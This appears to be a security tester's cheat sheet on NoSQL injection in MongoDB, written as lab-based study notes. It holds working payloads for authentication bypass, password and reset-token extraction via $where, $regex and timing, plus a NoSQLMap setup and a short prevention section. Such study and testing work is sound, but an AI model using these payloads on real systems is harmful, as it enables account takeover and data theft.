---
description: mongoDB, Redis, Cassandra
---

# NoSQLi

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection" %}

## Types of NoSQL injection

* **Syntax injection** - This occurs when you can break the NoSQL query syntax, enabling you to inject your own payload.
* **Operator injection** - This occurs when you can use NoSQL query operators to manipulate queries.

## NoSQL syntax injection

{% code overflow="wrap" fullWidth="true" %}
```sh
Break the query syntax -> test each input by submitting fuzz strings and special chars that trigger a database error
or some other detectable behaviour.
If you know the API language of the target database, use special chars and fuzz strings. Otherwise, try a variety.

######################### Detecting syntax injection in MongoDB
https://insecure-website.com/product/lookup?category=fizzy
# App sends JSON query to retrieve relevant products from the product collection in the MongoDB database:
this.category == 'fizzy'
# To test whether the input may be vulnerable, submit a fuzz string in the value of the category parameter
'"`{                                                                                                                      '
;$Foo}
$Foo \xYZ
#  Use this fuzz string to construct the following attack: 
https://insecure-website.com/product/lookup?category='%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00                              '
# If this causes a change from the original response, this may indicate that user input isn't filtered or sanitized
# NOTE: if we inject a JSON payload, that would be
'\"`{\r;$Foo}\n$Foo \\xYZ\u0000
'
########################### Determining which characters are processed
# To determine which chars are interpreted, you can inject individual characters such as ' which results in Mongo query:
this.category == '''																												'
# If ' char has broken the query syntax -> confirm this by submitting a valid query string in the input:
this.category == '\''																												'
# If that last injection does not cause a syntax error, this may mean that the application is vulnerable

########################### Confirming conditional behavior
# After detecting a vuln -> determine whether you can influence boolean conditions using NoSQL syntax.
# Send two requests, one with a false condition and one with a true condition; e.g. ' && 0 && 'x and ' && 1 && 'x
https://insecure-website.com/product/lookup?category=fizzy'+%26%26+0+%26%26+'x
https://insecure-website.com/product/lookup?category=fizzy'+%26%26+1+%26%26+'x
# If the app behaves differently -> false condition impacts the query logic, but the true condition doesn't

########################## Overriding existing conditions
# For example, you can inject a JavaScript condition that always evaluates to true, such as '||'1'=='1:
https://insecure-website.com/product/lookup?category=fizzy%27%7c%7c%27%31%27%3d%3d%27%31
 This results in the following MongoDB query:
this.category == 'fizzy'||'1'=='1'
# As the injected condition is always true, the modified query returns all items / NOTE: be careful with OR 1=1 queries
# You could also add a null char -> MongoDB may ignore all subsequent conditions after that null char, for example:
this.category == 'fizzy' && this.released == 1
# In this case, an attacker could construct an attack as follows:
https://insecure-website.com/product/lookup?category=fizzy'%00																	'
# This results in the following NoSQL query:
this.category == 'fizzy'\u0000' && this.released == 1																	'
# If MongoDB ignores all chars after the null char -> all products in the fizzy category are displayed, even unreleased products. 
```
{% endcode %}

## NoSQL operator injection

{% code overflow="wrap" fullWidth="true" %}
```sh
Query operators -> specify conditions that data must meet to be included in the query result. Examples of MongoDB:
    $where - Matches documents that satisfy a JavaScript expression.
    $ne - Matches all values that are not equal to a specified value.
    $in - Matches all of the values specified in an array.
    $regex - Selects documents where values match a specified regular expression.

######################### Submitting query operators
# In JSON messages, you can insert query operators as nested objects.
{"username":"wiener"} becomes {"username":{"$ne":"invalid"}}
# For URL-based inputs, you can insert query operators via URL parameters
username=wiener becomes username[$ne]=invalid
# If this doesn't work:
    1. Convert the request method from GET to POST.
    2. Change the Content-Type header to application/json.
    3. Add JSON to the message body.
    4. Inject query operators in the JSON.
# NOTE: Content Type Converter extension -> converts the request method and change a URL-encoded POST request to JSON. 

###################### Detecting operator injection in MongoDB
# Consider a vulnerable application that accepts a username and password in the body of a POST request:
{"username":"wiener","password":"peter"}
# Test each input with a range of operators -> test if username input processes the query operator:
{"username":{"$ne":"invalid"},"password":"peter"}
# If the $ne operator is applied, this queries all users where the username is not equal to invalid.
# If both the username and password inputs process the operator, it may be possible to bypass authentication:
{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}
# This query returns all login credentials where user&pass are not equal to invalid (login w/ first user on collection)
# To target an account, you can construct a payload that includes a known username, or a username that you've guessed
{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}
# Regex
{"username":  {"$regex":"admin.*"} 
{"username":  {"$regex":"^admin.*"}
{"username":  {"$regex":"admin.*", "$options":"i"} # insensitive
```
{% endcode %}

## Exploiting syntax injection to extract data

{% code overflow="wrap" fullWidth="true" %}
```sh
In many NoSQL databases, some query operators or functions can run limited JavaScript code -> $where, mapReduce()
####################### Exfiltrating data in MongoDB
# Consider a vuln app that allows users to look up other registered usernames and displays their role:
https://insecure-website.com/user/lookup?username=admin
# This results in the following NoSQL query of the users collection:
{"$where":"this.username == 'admin'"}
# As the query uses the $where operator -> inject JavaScript functions into this query to return sensitive data:
admin' && this.password[0] == 'a' || 'a'=='b
# This returns the first character of the user's password string, enabling you to extract the password char by char
# You could also use the JavaScript match() function to extract information. For example, identify if pwd has digits:
admin' && this.password.match(/\d/) || 'a'=='b

####################### Identifying field names
# MongoDB handles semi-structured data that doesn't require a fixed schema -> identify valid fields to extract data
# To identify whether the MongoDB database contains a password field, you could submit the following payload:
https://insecure-website.com/user/lookup?username=admin'+%26%26+this.password!%3d'
# Send the payload again for an existing field and for a field that doesn't exist (you know username exists so send):
admin' && this.username!=' admin' && this.foo!='
# If the password field exists, you'd expect the response to be identical to the response for the existing field 
# (username), but different to the response for the field that doesn't exist (foo). 
# To test different field names -> dictionary attack (wordlist to cycle through different potential field names)

# EXAMPLE: extract administrator password
/user/lookup?user=myuser
myuser' && this.password[0] == 'p' || 'a'=='b    # in case we know first char of the password, we can know if it works
administrator' && this.password.length > 8 || 'a'=='b # Then find password length
When we know password length > Intruder > Cluster bomb
administrator' && this.password[0] == 'p' || 'a'=='b # add payload to 0 and p (password digit iteration and char)
First payload will be 0-1-2..-till password length, second will be alphanumeric or any other symbols might exist on pwd
```
{% endcode %}

## Exploiting NoSQL operator injection to extract data

Even if the original query doesn't use any operators that enable you to run arbitrary JavaScript, you may be able to inject one of these operators yourself. You can then use boolean conditions to determine whether the application executes any JavaScript that you inject via this operator.

{% code overflow="wrap" fullWidth="true" %}
```sh
######################## Injecting operators in MongoDB
# Consider a vuln app that accepts username and password in the body of a POST request:
{"username":"wiener","password":"peter"}
# To test whether you can inject operators -> add $where operator as an additional parameter to evaluates to false/true
{"username":"wiener","password":"peter", "$where":"0"}
{"username":"wiener","password":"peter", "$where":"1"}
# If there is a difference between the responses -> JavaScript expression in the $where clause is being evaluated. 

####################### Extracting field names
# If you could inject an operator that enables you to run JavaScript -> keys() to extract the name of data fields:
"$where":"Object.keys(this)[0].match('^.{0}a.*')" # inspects first field in the object and return first char
# This enables you to extract the field name character by character. 

####################### Exfiltrating data using operators
# You may be able to use the $regex operator to extract data character by character. 
#  Consider a vuln app that accepts a username and password in the body of a POST request:
{"username":"myuser","password":"mypass"}
# You could start by testing whether the $regex operator is processed as follows:
{"username":"admin","password":{"$regex":"^.*"}}
# If response different to when you submit an incorrect password -> app may be vulnerable
# Then you can use the $regex operator to extract data character by character -> check if password begins with an a
{"username":"admin","password":{"$regex":"^a*"}}

# EXAMPLE: Exploiting NoSQL operator injection to extract unknown fields
- Check POST /login request {"username":"wiener","password":"peter"}
- Try to bypass it w/ {"username":"wiener","password":{"$ne":"invalid"}}
- We saw it works but w/ username carlos we see "account locked: please reset your password"
- Using {"username":"carlos","password":{"$ne":"invalid"},"$where":"1"} and w/ "$where":"0" we see different responses
- That means $where clause is being evaluated so we can inject operators
- Get fields -> {"username":"carlos","password":{"$ne":"invalid"},"$where":"Object.keys(this)[1].match('^.{0}a.*')"}
- Intruder > Cluster bomb > add payloads to [0] (numbers from 1-20) and {0} (a-z, A-Z, 0-9)
- With that we identify 1st field sorting by Length -> # then change (this)[2] and others to retrieve more fields
- In this case, the fourth field is resetPwdToken
- Try this parameter on other requests -> /forgot-password endpoint found that accepts the parameter as GET request
GET /forgot-password?resetPwdToken=a
- Previous request said "Invalid token" so we know that is the good way to reset our pwd once we get the reset token
- We confirm we can inject that parameter and says "account locked" with a true statement like this:
{"username":"carlos","password":{"$ne":"invalid"},"resetPwdToken":{"$ne":""}}
- Now to extract the resetPwdToken we use $where clause with match 
{"username":"carlos","password":{"$ne":"invalid"},"$where":"this.resetPwdToken.match(/^.*/)"}
- Use Burp Intruder "$where":"this.YOURTOKENNAME.match('^.{§§}§§.*')"
Make sure that you replace YOURTOKENNAME with the password reset token name that you exfiltrated in the previous step. 
- Finally, go to /forgot-password?resetPwdToken=XXX with the real token and reset carlos password
```
{% endcode %}

## Timing based injection

{% code overflow="wrap" fullWidth="true" %}
```sh
   1. Load the page several times to determine a baseline loading time.
   2. Insert a timing based payload into the input to cause an intentional delay in the response when executed.
For example, {"$where": "sleep(5000)"} causes an intentional delay of 5000 ms on successful injection.
   4. Identify whether the response loads more slowly. This indicates a successful injection.
#  The following timing based payloads will trigger a time delay if the password beings with the letter a: 
admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'
admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'
```
{% endcode %}

## Preventing NoSQL injection

* Sanitize and validate user input, using an allowlist of accepted characters.
* Insert user input using parameterized queries instead of concatenating user input directly into the query.
* To prevent operator injection, apply an allowlist of accepted keys.

## Other Payloads

<pre class="language-sh" data-overflow="wrap" data-full-width="true"><code class="lang-sh"><strong>username[$ne]=1&#x26;password[$ne]=1
</strong>
admin' || 'a'=='a

# Malicious input
username=tolkien’, $or: [ {}, { ‘a’:’a&#x26;password=’ } ], $comment:’successful MongoDB injection’
# This input will be constructed into the following query:
{ username: ‘tolkien’, $or: [ {}, { ‘a’: ‘a’, password: ‘’ } ], $comment: ‘successful MongoDB injection’ }

# VERY IMPORTANT: If request is simple form, change content-type to application/json and try {"username":"admin", "password":"password"} structure 
# Now start removing some characters like last } or last " to see if we trigger any error
</code></pre>

## NoSQLmap

```bash
git clone https://github.com/codingo/NoSQLMap.git
cd NoSQLMap/
ls
pip install couchdb
pip install pbkdf2
pip install ipcalc
python nosqlmap.py

# Create an exception dump message with MongoDB using a malformed NoSQLQuery:
`a'; return this.a != 'BadData’'; var dummy='!`
```
